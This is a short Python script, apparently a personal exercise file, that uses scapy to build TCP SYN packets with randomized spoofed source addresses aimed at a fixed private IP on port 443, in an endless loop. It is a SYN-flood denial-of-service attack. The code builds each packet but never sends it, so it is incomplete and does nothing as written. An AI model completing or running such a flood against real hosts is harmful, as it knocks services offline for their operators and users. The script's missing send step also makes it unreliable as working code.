#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@author: zhouey
@file: 1.py
@time: 2020/11/28 16:55
"""
from scapy.all import *


def syn_flood(ip,sport,dport):
    s_addr =RandIP()
    d_addr=ip
    packet =IP(src=s_addr,dst=d_addr)/TCP(sport=sport,dport=dport,seq=1505066,flags='S')


if __name__ == '__main__':
    while True:
        syn_flood('172.16.77.42',1234,443)